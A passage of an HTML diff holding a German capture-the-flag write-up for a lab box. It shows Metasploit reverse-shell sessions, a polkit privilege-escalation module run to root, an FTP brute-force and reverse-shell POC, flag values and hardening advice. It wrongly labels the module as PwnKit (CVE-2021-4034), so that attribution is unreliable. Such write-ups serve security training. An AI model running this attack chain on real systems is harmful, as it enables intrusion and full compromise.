+                     <pre>SESSION => 1</pre>
+                    <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">run</span></div>
+                     <pre>
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 192.168.2.140:4433
+[*] Sending stage (989032 bytes) to 192.168.2.147
+<span class="password">[*] Meterpreter session 2 opened (192.168.2.140:4433 -> 192.168.2.147:38356) at 2022-10-13 16:44:19 +0200</span>
+[*] Command stager progress: 100.00% (773/773 bytes)
+[*] Post module execution completed
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse Fortsetzung:** Eine Meterpreter-Session (ID 2) wurde erfolgreich etabliert. Nun wird nach lokalen Privilegieneskalations-Exploits gesucht. Es wird der Exploit `linux/local/polkit_dbus_auth_bypass` ausgewählt, der eine bekannte Schwachstelle im Polkit-Dienst (auch bekannt als PwnKit, CVE-2021-4034) ausnutzt.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Annahme: Wechsel zur Meterpreter Session 2 -->
+                     <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">sessions -i 2</span></div>
+                     <pre>[*] Starting interaction with 2...</pre>
+                     <div class="prompt meterpreter-prompt">meterpreter > <span class="command">background</span></div>
+                     <pre>[*] Backgrounding session 2...</pre>
+                    <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">use exploit/linux/local/polkit_dbus_auth_bypass</span></div>
+                    <pre>[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/polkit_dbus_auth_bypass) > <span class="command">set LPORT 4567</span></div> <!-- Anderer Port für die Root-Shell -->
+                    <pre>LPORT => 4567</pre>
+                     <!-- Iterations, Username, Password scheinen für diesen Exploit nicht direkt relevant, werden aber gesetzt -->
+                     <div class="prompt metasploit-prompt">msf6 exploit(linux/local/polkit_dbus_auth_bypass) > <span class="command">set iterations 400</span></div>
+                     <pre>iterations => 400</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/polkit_dbus_auth_bypass) > <span class="command">set username benni</span></div>
+                     <pre>username => benni</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/polkit_dbus_auth_bypass) > <span class="command">set password hacker</span></div>
+                     <pre>password => hacker</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/polkit_dbus_auth_bypass) > <span class="command">set SESSION 2</span></div> <!-- Zielt auf die Meterpreter-Session -->
+                     <pre>SESSION => 2</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/polkit_dbus_auth_bypass) > <span class="command">run</span></div>
+                     <pre>
+[*] Started reverse TCP handler on 192.168.2.140:4567 <span class="comment"><-- Korrektur: Port sollte 4567 sein</span>
+[*] Running automatic check ("set AutoCheck false" to disable)
+[*] Checking for exploitability via attempt
+<span class="password">[+] The target is vulnerable. The polkit framework instance is vulnerable.</span>
+[*] Attempting to create user hacker <span class="comment"><-- Teil des Exploits, temporärer User</span>
+[+] User hacker created with UID 1001
+[*] Attempting to set the password of the newly created user, hacker, to: benni
+<span class="password">[+] Obtained code execution as root!</span>
+[*] Writing '/tmp/lxLwF' (207 bytes) ...
+[*] Sending stage (989032 bytes) to 192.168.2.147
+[+] Deleted /tmp/lxLwF
+<span class="password">[*] Meterpreter session 3 opened (192.168.2.140:4567 -> 192.168.2.147:53250) at 2022-10-13 16:52:11 +0200</span>
+[*] Attempting to remove the user added:
+[+] Successfully removed hacker
+</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Metasploit automatisiert den Prozess: Es empfängt die initiale Shell, rüstet sie zu Meterpreter auf und nutzt dann den Polkit-Exploit (PwnKit) über die bestehende Meterpreter-Session (ID 2), um eine *neue* Meterpreter-Session (ID 3) mit Root-Rechten zu erhalten. Der Exploit erstellt kurzzeitig einen Benutzer, führt Code als Root aus, um die Payload zu starten, und löscht den Benutzer wieder.</p>
+            <p class="analysis"><strong>Analyse Fortsetzung:** Es wird zur neuen Root-Meterpreter-Session (ID 3) gewechselt und eine interaktive Shell gestartet.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Annahme: sessions -i 3 -->
+                     <div class="prompt meterpreter-prompt">meterpreter > <span class="command">shell</span></div>
+                     <pre>
+Process 13970 created.
+Channel 1 created.
+sh: 0: getcwd() failed: No such file or directory <span class="password"><-- Bekanntes Problem nach PwnKit</span>
+</pre>
+                     <div class="prompt">[Kein Prompt - Root Shell] # <span class="command">id</span></div>
+                     <pre><span class="password">uid=0(root) gid=0(root) groups=0(root)</span></pre>
+                     <div class="prompt">[Kein Prompt - Root Shell] # <span class="command">pwd</span></div>
+                     <pre>sh: 0: getcwd() failed: No such file or directory</pre>
+                     <div class="prompt">[Kein Prompt - Root Shell] # <span class="command">python3 -c "import pty;pty.spawn('/bin/bash')"</span></div>
+                     <pre>
+shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
+sh: 0: getcwd() failed: No such file or directory
+</pre>
+                    <div class="prompt">root@nowords:# <span class="command">export TERM=xterm</span></div>
+                    <div class="prompt">root@nowords:# <span class="command">pwd</span></div>
+                    <pre>pwd: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory</pre>
+                    <div class="prompt">root@nowords:# <span class="command">cd /etc</span></div>
+                     <pre>chdir: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory</pre>
+                    <div class="prompt">root@nowords:/etc# <span class="command">find / -name root.txt 2>/dev/null</span></div> <!-- Maskierung: > -->
+                    <pre>/root/root.txt</pre>
+                    <div class="prompt">root@nowords:/etc# <span class="command">cat /root/root.txt</span></div>
+                    <pre><span class="password">Ihavenowords</span></pre>
+                    <div class="prompt">root@nowords:/etc#</div>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Privilegieneskalation mittels PwnKit war erfolgreich, wie `id` bestätigt. Die Root-Shell wird erlangt. Es gibt einige Probleme mit dem Arbeitsverzeichnis (`getcwd() failed`), was nach diesem Exploit vorkommen kann, aber die Shell ist funktionsfähig. Die Root-Flag wird in `/root/root.txt` gefunden und ausgelesen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Root-Zugriff wurde erlangt und das Root-Flag gefunden. Dokumentieren Sie den Weg über FTP-Zugang, RCE durch unsicheren Dateiupload/Trigger und Privilegieneskalation mittels Polkit/PwnKit.
+<br><strong>Empfehlung (Admin):** Patchen Sie das System dringend, um die Polkit-Schwachstelle (CVE-2021-4034) zu beheben. Überprüfen und härten Sie die FTP-Konfiguration. Beheben Sie die unsichere Dateiupload- und Ausführungslogik. Überwachen Sie das System auf verdächtige Prozesse und Netzwerkverbindungen.</p>
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept (POC)</h2>
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Dieser POC beschreibt die Kette von Schwachstellen, die zur Kompromittierung des Systems führte: Erlangung von Benutzerzugangsdaten für FTP durch Brute-Force, Ausnutzung eines unsicheren Mechanismus zum Hochladen und Ausführen von Code als dieser Benutzer (Initial Access) und anschließende Privilegieneskalation zu Root durch Ausnutzung der PwnKit-Schwachstelle (CVE-2021-4034) im Polkit-Dienst.</p>
+
+            <h3>POC Schritt 1: Initial Access (FTP Brute-Force & RCE)</h3>
+            <p class="analysis"><strong>Schwachstellen:</strong> Schwaches FTP-Passwort, unsicherer Mechanismus zur Codeausführung via Dateiupload.</p>
+             <p class="analysis"><strong>Voraussetzungen:</strong> Netzwerkzugriff, `hydra`, `ftp` (oder Skript), `nc`.</p>
+             <p class="analysis"><strong>Schritte:</strong></p>
+             <ol>
+                 <li>Benutzername `sophie` ermitteln (z.B. aus Webseiten-Hinweis).</li>
+                 <li>FTP-Passwort für `sophie` mit `hydra` brute-forcen (Passwort: `natalia`).</li>
+                 <li>Per FTP einloggen und Reverse-Shell-Skript (`script.sh`) nach `/me/` hochladen.</li>
+                 <li>Trigger-Datei (`command.jpg` mit Inhalt `/bin/bash /home/me/script.sh`) nach `/home/sophie/` hochladen.</li>
+                 <li>Listener starten: `nc -lvnp 4444`.</li>
+                 <li>Warten, bis der (unbekannte) Trigger-Mechanismus `script.sh` ausführt und die Shell eingeht.</li>
+             </ol>
+             <p class="analysis"><strong>Ergebnis:</strong> Reverse Shell als Benutzer `sophie`.</p>
+             <p class="analysis"><strong>Beweismittel:</strong> Eingehende Verbindung auf Port 4444 mit dem Prompt `sophie@nowords:~$`.</p>
+
+            <h3>POC Schritt 2: Privilege Escalation (Polkit/PwnKit)</h3>
+             <p class="analysis"><strong>Schwachstelle:</strong> CVE-2021-4034 (PwnKit) im Polkit-Dienst.</p>
+             <p class="analysis"><strong>Voraussetzungen:</strong> Shell als Benutzer `sophie`, Metasploit Framework.</p>
+             <p class="analysis"><strong>Schritte:</strong></p>
+             <ol>
+                 <li>Metasploit-Handler starten, um `sophie`-Shell zu empfangen (`exploit/multi/handler`).</li>
+                 <li>Shell zu Meterpreter upgraden (`post/multi/manage/shell_to_meterpreter`).</li>
+                 <li>Polkit-Exploit-Modul laden (`exploit/linux/local/polkit_dbus_auth_bypass`).</li>
+                 <li>Session auf die Meterpreter-Session von `sophie` setzen.</li>
+                 <li>Exploit ausführen (`run`).</li>
+                 <li>Zur neu erstellten Root-Meterpreter-Session wechseln.</li>
+                 <li>Interaktive Shell starten (`shell`).</li>
+             </ol>
+             <p class="analysis"><strong>Ergebnis:</strong> Interaktive Root-Shell.</p>
+             <p class="analysis"><strong>Beweismittel:</strong> Ausführung von `id` in der Shell zeigt `uid=0(root)`. Lesen von `/root/root.txt` ist möglich.</p>
+
+            <p class="evaluation"><strong>Risikobewertung:</strong> Das System weist mehrere kritische Schwachstellen auf. Schwache Passwörter und fehlender Brute-Force-Schutz ermöglichen initialen Zugriff. Ein obskurer, unsicherer Mechanismus zur Codeausführung erlaubt RCE. Eine bekannte, ungepatchte Betriebssystem-Schwachstelle (PwnKit) ermöglicht die vollständige Privilegieneskalation zu Root. Das Gesamtrisiko ist als sehr hoch einzustufen.</p>
+             <p class="recommendation"><strong>Empfehlungen:**
+*   **Admin:** System dringend patchen (insbesondere Polkit). FTP-Passwörter ändern und härten. Mechanismus zur Codeausführung aus Bilddateien entfernen. `sudo`-Regeln überprüfen. Dateiberechtigungen korrigieren (z.B. für `/me`).
+*   **Pentester:** Alle gefundenen Schwachstellen detailliert dokumentieren.</p>
+
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /me/user.txt (via FTP)</div>
+                     <div class="flag-value"><span class="password">Icanreadyeah</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt (via Root-Shell)</div>
+                     <div class="flag-value"><span class="password">Ihavenowords</span></div>
+                 </div>
+             </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 13. Oktober 2022</p> <!-- Datum angepasst -->
+    </footer>
+</body>
+</html>
